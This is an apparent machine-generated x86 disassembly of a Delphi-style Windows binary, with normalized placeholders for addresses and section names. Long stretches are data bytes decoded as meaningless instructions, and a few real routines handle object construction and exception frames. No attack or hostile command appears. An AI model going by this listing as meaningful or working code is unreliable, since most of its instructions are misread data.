add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al bh
arpl [ ebp + 0x66 ] sp
jne r-xdata
inc ebp
dec ecx
push eax
jb r-xdata
insb
imul esp [ ebx + edx * 2 + 0x65 ] 0x63697672
popad
insd
mov eax eax
inc ebp
js r-xdata
xchg esp eax
inc ebp
add [ eax + eax ] cl
add [ eax ] al
xor [ ebx + 0x34c40045 ] dl
inc eax
add al dl
xor al 0x40
add ah dl
xor al 0x40
add al bl
xor al 0x40
add ah cl
xor al 0x40
add [ edx + esi ] ch
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x450e0040 ] al
dec ecx
push edx
popad
push esp
imul ebp [ ebp + 0x65 ] 0x9074756f
push esp
xchg ebp eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
clc
insb
jns r-xdata
mov eax eax
je r-xdata
dec esi
add ah cl
xor al 0x40
add [ edx + esi ] ch
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x45150040 ] al
dec ecx
dec ecx
outsb
jbe r-xdata
nop
rcl [ ebp + 0x45 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al al
xchg ebp eax
inc ebp
add [ eax + eax ] cl
add [ eax ] al
xor [ ebx + 0x34c40045 ] dl
inc eax
add al dl
xor al 0x40
add ah dl
xor al 0x40
add al bl
xor al 0x40
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] bh
xchg esp eax
inc ebp
add [ eax + eax ] cl
add [ eax ] al
mov [ ebx + 0x34c40045 ] ss
xchg esp eax
inc ebp
add [ eax ] al
xor [ ebx + 0x34c40045 ] dl
inc eax
add al dl
xor al 0x40
add ah dl
xor al 0x40
add al bl
xor al 0x40
add ah cl
xor al 0x40
add [ edx + esi ] ch
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x450f0040 ] al
dec ecx
inc ebx
insb
outsd
jae r-xdata
xchg esp eax
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + edx * 4 + 0xc0045 ] bl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0xc004597 ] ch
add [ eax ] al
add [ eax ] al
xchg edi eax
inc ebp
add ah al
xor al 0x40
outsd
outsb
dec esp
xchg edi eax
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + edx * 4 + 0x45 ] cl
in al dx
xchg esi eax
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah ch
arpl [ edi + 0x6c ] bp
push edx
jo r-xdata
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + ebx * 4 + 0x45 ] dh
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
or al 0x98
outsd
jb r-xdata
xchg esi eax
inc ebp
add [ eax + eax ] cl
add [ eax ] al
xor [ ebx + 0x34c40045 ] dl
inc eax
add al dl
xor al 0x40
add ah dl
xor al 0x40
add al bl
xor al 0x40
add ah cl
xor al 0x40
add [ edx + esi ] ch
inc eax
add [ eax + 0x32 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jns r-xdata
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x67 ] al
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
je r-xdata
inc ebp
add [ eax + eax ] cl
add [ eax ] al
add [ edi + 0x34c40045 ] dl
inc eax
add al dl
xor al 0x40
add ah dl
xor al 0x40
add al bl
xor al 0x40
add ah cl
xor al 0x40
add [ edx + esi ] ch
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x451b0040 ] al
dec ecx
push ebx
outsd
arpl [ ebx + 0x73 ] bp
push edx
jno r-xdata
inc esi
popad
imul ebp [ ebp + 0x64 ] 0x980cc08b
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + ebx * 4 ] cl
nop
jae r-xdata
inc eax
add [ edx + esi + 0x45130040 ] al
dec ecx
inc ebx
outsd
outsb
outsb
arpl [ gs : ebp + eax * 2 + 0x78 ] si
arpl [ ebp + 0x70 ] sp
je r-xdata
add al dl
xor al 0x40
add ah dl
xor al 0x40
add al bl
xor al 0x40
add ah cl
xor al 0x40
add [ edx + esi ] ch
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x45150040 ] al
dec ecx
push ebx
outsd
arpl [ ebx + 0x73 ] bp
push edx
jno r-xdata
shr [ eax + 0x4597 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
test al 0x97
inc ebp
add [ eax + eax ] cl
add [ eax ] al
add [ edi + 0x34c40045 ] dl
inc eax
add [ edx + esi ] ch
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x45110040 ] al
dec ecx
inc ebx
outsd
outsb
outsb
arpl [ gs : esp + edx * 2 + 0x69 ] si
insd
outsd
jne r-xdata
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jb r-xdata
inc ebp
add [ eax + eax ] cl
add [ eax ] al
add [ edi + 0x34c40045 ] dl
inc eax
add al dl
xor al 0x40
add ah dl
xor al 0x40
add al bl
xor al 0x40
add ah cl
xor al 0x40
add [ edx + esi ] ch
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x451a0040 ] al
dec ecx
push ebx
outsd
arpl [ ebx + 0x73 ] bp
push ebx
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc eax
cdq
dec ecx
outsb
je r-xdata
add [ eax + eax ] cl
add [ eax ] al
add [ edi + 0x34c40045 ] dl
inc eax
add al dl
xor al 0x40
add ah dl
xor al 0x40
add al bl
xor al 0x40
add ah cl
xor al 0x40
add [ edx + esi ] ch
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x451a0040 ] al
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0xc004599 ] ch
add [ eax ] al
add [ eax ] al
xchg edi eax
inc ebp
add ah al
xor al 0x40
add al dl
xor al 0x40
add ah dl
xor al 0x40
add al bl
xor al 0x40
add ah cl
xor al 0x40
add [ edx + esi ] ch
inc eax
add [ eax + 0x32 ] cl
outsd
jb r-xdata
fcomp [ eax + 0x45 ]
push ebx
jb r-xdata
add [ eax + eax ] cl
add [ eax ] al
xor [ ebx + 0x34c40045 ] dl
inc eax
add al dl
xor al 0x40
add ah dl
xor al 0x40
add al bl
xor al 0x40
add ah cl
xor al 0x40
add [ edx + esi ] ch
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x450d0040 ] al
dec ecx
push ebx
outsd
arpl [ ebx + 0x73 ] bp
inc ebp
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
dec esp
xchg edi eax
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
in al dx
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
aam 0x9a
inc ebp
add [ eax + eax ] cl
add [ eax ] al
push 0x6f727245
jb r-xdata
inc eax
add [ edx + esi + 0x45170040 ] al
jae r-xdata
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x45140040 ] al
dec ecx
push ebx
outsd
arpl [ ebx + 0x73 ] bp
push ebp
outsb
imul ebp [ esi + 0x6f ] 0x77
outsb
sub al 0x32
add [ eax ] al
add [ edi + 0x34c40045 ] dl
inc eax
add al dl
xor al 0x40
add ah dl
xor al 0x40
add al bl
xor al 0x40
add ah cl
xor al 0x40
add [ edx + esi ] ch
popad
imul ebp [ ebp + 0x64 ] 0x4598dc90
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah bl
cwde
inc ebp
add [ eax + eax ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push 0x6874654d
outsd
inc ebp
jb r-xdata
jno r-xdata
inc eax
add [ eax - 0x67 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
fcomp [ eax + 0xc0045 ]
jb r-xdata
push ebx
jb r-xdata
ror [ esi + edx * 4 + 0x45 ] 0x0
arpl [ eax + 0x61 ] bp
bound ebp [ ebp + 0x45 ]
jb r-xdata
jb r-xdata
dec ecx
push ebx
outsd
arpl [ ebx + 0x73 ] bp
inc ecx
jne r-xdata
shr [ edx + ebx * 4 + 0x45 ] 0x0
add [ eax ] al
add [ eax ] al
outsd
outsb
inc ebp
jb r-xdata
jb r-xdata
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
insb
0xc0045 0x0
add [ edi + 0x34c40045 ] dl
inc eax
add al dl
xor al 0x40
add ah dl
xor al 0x40
add al bl
xor al 0x40
add ah cl
xor al 0x40
add [ edx + esi ] ch
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x451a0040 ] al
dec ecx
push ebx
outsd
arpl [ ebx + 0x73 ] bp
push ebx
jb r-xdata
outsd
jb r-xdata
dec ecx
push ebx
outsd
arpl [ ebx + 0x73 ] bp
push edx
jno r-xdata
xor al [ eax ]
dec eax
xor al [ eax ]
test [ edx ] dh
inc eax
add [ edx ] bl
inc ebp
popad
imul ebp [ ebp + 0x64 ] r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + edx * 4 + 0xc0045 ] cl
add [ eax ] al
xor [ ebx + 0x34c40045 ] dl
inc eax
add al dl
xor al 0x40
add ah dl
xor al 0x40
add al bl
xor al 0x40
add ah cl
xor al 0x40
add [ eax ] al
and al 0x96
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] ch
xchg esi eax
inc ebp
add [ eax ] dl
add [ eax ] al
add [ eax ] dh
xchg ebx eax
inc ebp
add ah al
xor al 0x40
add al dl
xor al 0x40
add ah dl
xor al 0x40
add al bl
xor al 0x40
add ah cl
xor al 0x40
add [ edx + esi ] ch
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi - 0x61bbffc0 ] al
inc ebp
add [ 0x50644945 ] dl
imul esp [ ebx + 0x65 ] 0x656d614e
mov eax eax
jb r-xdata
outsd
jb r-xdata
sub al 0x32
jb r-xdata
add [ eax ] al
outsd
jb r-xdata
jb r-xdata
add ah cl
xor al 0x40
add [ edx + esi ] ch
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x451d0040 ] al
dec ecx
push ebx
outsd
arpl [ ebx + 0x73 ] bp
push ebx
jb r-xdata
outsb
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + ebx * 4 ] cl
inc ebp
add [ eax + eax ] cl
add [ eax ] al
add [ edi + 0x34c40045 ] dl
inc eax
add al dl
xor al 0x40
add ah dl
xor al 0x40
add al bl
xor al 0x40
add ah cl
xor al 0x40
add [ edx + esi ] ch
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x45110040 ] al
dec ecx
push ebx
outsd
arpl [ ebx + 0x73 ] bp
inc ecx
jne r-xdata
0x45 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
or al 0x9a
mov al 0x9b
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0xc00459b ] dh
add [ eax ] al
add [ eax ] al
xchg edi eax
inc ebp
add ah al
xor al 0x40
and [ ebp + eax * 2 ] bl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] ah
pushfd
inc ebp
add [ eax + eax ] cl
add [ eax ] al
add [ edi + 0x34c40045 ] dl
inc eax
add al dl
xor al 0x40
add ah dl
xor al 0x40
jb r-xdata
add al dl
xor al 0x40
add ah dl
xor al 0x40
add al bl
xor al 0x40
shl [ eax + 0x459b ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov al 0x9b
inc ebp
add [ eax + eax ] cl
add [ eax ] al
add [ edi + 0x34c40045 ] dl
inc eax
push ebp
outsb
jb r-xdata
jb r-xdata
jb r-xdata
imul esi [ ebx + 0x73 ] 0x456e6f69
inc ebp
jb r-xdata
test al 0x99
inc ebp
add [ eax ] al
jb r-xdata
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x45210040 ] al
dec ecx
push ebx
outsd
arpl [ ebx + 0x73 ] bp
push ebx
jb r-xdata
rol [ eax - 0x65 ] 0x45
jb r-xdata
insb
inc ebp
jb r-xdata
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
jb r-xdata
push esp
jb r-xdata
mov eax eax
outsd
jbe r-xdata
popad
arpl [ eax + 0x61 ] bp
bound ebp [ ebp + 0x45 ]
jb r-xdata
add ah cl
xor al 0x40
add [ edx + esi ] ch
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x45220040 ] al
inc eax
je r-xdata
jb r-xdata
popad
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x65 ] al
inc ebp
add [ eax + eax ] cl
add [ eax ] al
add [ edi + 0x34c40045 ] dl
inc eax
add al dl
xor al 0x40
add ah dl
xor al 0x40
add al bl
xor al 0x40
add ah cl
xor al 0x40
add [ edx + esi ] ch
outsd
jb r-xdata
jb r-xdata
inc ebp
jb r-xdata
add al bl
xor al 0x40
add ah cl
xor al 0x40
add [ edx + esi ] ch
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x45240040 ] al
dec ecx
push ebx
outsd
arpl [ ebx + 0x73 ] bp
push ebx
jb r-xdata
aam 0x34
inc eax
outsd
jae r-xdata
outsd
jb r-xdata
imul esi [ edx + 0x65 ] 0x72724564
add ah al
xor al 0x40
outsd
outsb
outsb
outsd
arpl [ ebx + 0x73 ] bp
push ebx
jb r-xdata
add [ 0x53644945 ] bl
jb r-xdata
outsd
jb r-xdata
outsd
dec ecx
push ebx
outsd
arpl [ ebx + 0x73 ] bp
push ebx
jb r-xdata
dec eax
xor al [ eax ]
test [ edx ] dh
inc eax
add [ edx ] ah
inc ebp
outsb
add [ edi + 0x34c40045 ] dl
inc eax
add al dl
xor al 0x40
add ah dl
xor al 0x40
add al bl
xor al 0x40
aam 0x9a
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah dl
0xc0045 0x0
rol [ eax ] 0x9d
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
popfd
inc ebp
add [ eax + eax ] cl
add [ eax ] al
add [ edi + 0x34c40045 ] dl
inc eax
add al dl
xor al 0x40
add ah dl
xor al 0x40
add al bl
xor al 0x40
add ah cl
xor al 0x40
add [ edx + esi ] ch
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x451a0040 ] al
popfd
outsb
push edx
jne r-xdata
outsd
inc ebp
jb r-xdata
push 0x459d
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x63 ] ch
inc ebp
add [ eax + eax ] cl
add [ eax ] al
add [ edi + 0x34c40045 ] dl
inc eax
jb r-xdata
jb r-xdata
nop
add al dl
xor al 0x40
add ah dl
xor al 0x40
add al bl
xor al 0x40
add ah cl
xor al 0x40
add [ edx + esi ] ch
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x451d0040 ] al
dec ecx
push ebx
inc eax
add [ esp + ebx * 4 + 0x45 ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
xchg esp eax
pushfd
inc ebp
add [ eax + eax ] cl
add [ eax ] al
add [ edi + 0x34c40045 ] dl
inc eax
nop
jb r-xdata
add al dl
xor al 0x40
add ah dl
xor al 0x40
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push 0xc00459d
add [ eax ] al
add [ eax ] al
xchg edi eax
inc ebp
add ah al
xor al 0x40
outsd
add [ eax ] al
add [ eax ] al
add [ eax ] al
jb r-xdata
add [ eax ] al
xor [ ebx + 0x34c40045 ] dl
inc eax
add al dl
xor al 0x40
add ah dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al dl
popfd
inc ebp
add [ eax + eax ] cl
dec ecx
push ebx
outsd
arpl [ ebx + 0x73 ] bp
push ebx
jb r-xdata
dec eax
xor al [ eax ]
test [ edx ] dh
inc eax
add [ edx ] bl
inc ebp
push esp
dec esp
inc ebp
js r-xdata
outsd
arpl [ ebx + 0x65 ] bp
je r-xdata
inc ebp
add [ eax ] dl
add [ eax ] al
add [ eax ] dh
xchg ebx eax
inc ebp
add ah al
xor al 0x40
add al dl
xor al 0x40
add ah dl
xor al 0x40
add al bl
xor al 0x40
add ah cl
xor al 0x40
add [ edx + esi ] ch
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi - 0x6173ffc0 ] al
inc ebp
add [ esi ] cl
inc ebp
dec ecx
push ebx
insb
imul esp [ ebx + edx * 2 + 0x6f ] 0x74656b63
add al bl
xor al 0x40
add ah cl
xor al 0x40
add [ edx + esi ] ch
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x451a0040 ] al
dec ecx
push ebx
outsd
arpl [ ebx + 0x73 ] bp
push ebx
jb r-xdata
outsd
insd
insd
popad
pop ebx
pop ebp
retn 0x4
jb r-xdata
xor al 0x40
add al bl
xor al 0x40
add ah cl
xor al 0x40
add [ edx + esi ] ch
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x45100040 ] al
dec ecx
dec ecx
jb r-xdata
mov eax edi
test bl bl
je r-xdata
outsd
jb r-xdata
lea eax [ eax ]
xor [ esi + 0x45 ] bl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
xor al 0x9e
jae r-xdata
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_4035f8
pop [ fs : 0x0 ]
add esp 0xc
outsb
jbe r-xdata
dec ecx
add [ eax ] al
inc ebp
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + ebx * 4 ] dh
outsd
jb r-xdata
outsb
inc ebp
rcr [ ebp + 0x45 ] 0x1
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
rcr [ ebp + 0xc0045 ] 0x1
sub_459e44
push ebp
mov ebp esp
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
mov ecx [ ebp + 0x8 ]
xor edx edx
mov eax edi
call sub_40b590
mov [ edi + 0xc ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035a0
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_4035f8
pop [ fs : 0x0 ]
add esp 0xc
sub_459e8c
push ebp
mov ebp esp
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
mov ecx [ ebp + 0x8 ]
xor edx edx
mov eax edi
call sub_40b590
mov [ edi + 0xc ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035a0
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_4035f8
pop [ fs : 0x0 ]
add esp 0xc
sub_459ed4
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_459ef9
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_459f00
retn
sub_459f0c
cmpsb [ fs : esi ] [ edi ]
inc edi
add dl dh
inc [ eax ]
add [ esi + 0x47 ] ah
add bl dh
inc [ eax ]
add [ esi + 0x47 ] ah
add ah dh
inc [ eax ]
add [ esi + 0x47 ] ah
add ch dh
inc [ eax ]
add [ esi + 0x47 ] ah
add dh dh
inc [ eax ]
add [ esi + 0x47 ] ah
add bh dh
inc [ eax ]
add [ esi + 0x47 ] ah
add al bh
inc [ eax ]
add [ esi + 0x47 ] ah
add cl bh
inc [ eax ]
add [ esi + 0x47 ] ah
add dl bh
inc [ eax ]
add [ esi + 0x47 ] ah
add bl bh
inc [ eax ]
add [ esi + 0x47 ] ah
add ah bh
inc [ eax ]
add [ esi + 0x47 ] ah
add ch bh
inc [ eax ]
add [ esi + 0x47 ] ah
add dh bh
inc [ eax ]
add [ esi + 0x47 ] ah
add bh bh
inc [ eax ]
add [ esi + 0x47 ] ah
add al ah
inc [ eax ]
add [ esi + 0x47 ] ah
add cl ah
inc [ eax ]
add [ esi + 0x47 ] ah
add dl ah
inc [ eax ]
add [ esi + 0x47 ] ah
add bl ah
inc [ eax ]
add [ esi + 0x47 ] ah
add ah ah
inc [ eax ]
add [ esi + 0x47 ] ah
add ch ah
inc [ eax ]
add [ esi + 0x47 ] ah
add dh ah
inc [ eax ]
add [ esi + 0x47 ] ah
add bh ah
inc [ eax ]
add [ esi + 0x47 ] ah
add al ch
inc [ eax ]
add [ esi + 0x47 ] ah
add cl ch
inc [ eax ]
add [ esi + 0x47 ] ah
add dl ch
inc [ eax ]
add [ esi + 0x47 ] ah
add bl ch
inc [ eax ]
add [ esi + 0x47 ] ah
add ah ch
inc [ eax ]
add [ esi + 0x47 ] ah
add ch ch
inc [ eax ]
add [ esi + 0x47 ] ah
add dh ch
inc [ eax ]
add [ esi + 0x47 ] ah
add bh ch
inc [ eax ]
add [ esi + 0x47 ] ah
add al dl
inc [ eax ]
add [ esi + 0x47 ] ah
add cl dl
inc [ eax ]
add [ esi + 0x47 ] ah
add dl dl
inc [ eax ]
add [ esi + 0x47 ] ah
add bl dl
inc [ eax ]
add [ esi + 0x47 ] ah
add ah dl
inc [ eax ]
add [ esi + 0x47 ] ah
add ch dl
inc [ eax ]
add [ esi + 0x47 ] ah
add dh dl
inc [ eax ]
add [ esi + 0x47 ] ah
add bh dl
inc [ eax ]
add [ esi + 0x47 ] ah
add al bl
inc [ eax ]
add [ esi + 0x47 ] ah
add cl bl
inc [ eax ]
add [ esi + 0x47 ] ah
add dl bl
inc [ eax ]
add [ esi + 0x47 ] ah
add bl bl
inc [ eax ]
add [ esi + 0x47 ] ah
add ah bl
inc [ eax ]
add [ esi + 0x47 ] ah
add ch bl
inc [ eax ]
add [ esi + 0x47 ] ah
add dh bl
inc [ eax ]
add [ esi + 0x47 ] ah
add bh bl
inc [ eax ]
add [ esi + 0x47 ] ah
add al al
inc [ eax ]
add [ esi + 0x47 ] ah
add cl al
inc [ eax ]
add [ esi + 0x47 ] ah
add dl al
inc [ eax ]
add [ esi + 0x47 ] ah
add bl al
inc [ eax ]
add [ esi + 0x47 ] ah
add ah al
inc [ eax ]
add [ esi + 0x47 ] ah
add ch al
inc [ eax ]
add [ esi + 0x47 ] ah
add dh al
inc [ eax ]
add [ esi + 0x47 ] ah
add bh al
inc [ eax ]
add [ esi + 0x47 ] ah
add al cl
inc [ eax ]
add [ esi + 0x47 ] ah
add cl cl
inc [ eax ]
add [ esi + 0x47 ] ah
add dl cl
inc [ eax ]
add [ esi + 0x47 ] ah
add bl cl
inc [ eax ]
add [ esi + 0x47 ] ah
add ah cl
inc [ eax ]
add [ esi + 0x47 ] ah
add ch cl
inc [ eax ]
add [ esi + 0x47 ] ah
add dh cl
inc [ eax ]
add [ esi + 0x47 ] ah
add bh cl
inc [ eax ]
add [ esi + 0x47 ] ah
add [ eax + 0x640000fe ] dh
cmpsb [ esi ] [ edi ]
inc edi
add [ ecx + 0x640000fe ] dh
cmpsb [ esi ] [ edi ]
inc edi
add [ edx + 0x640000fe ] dh
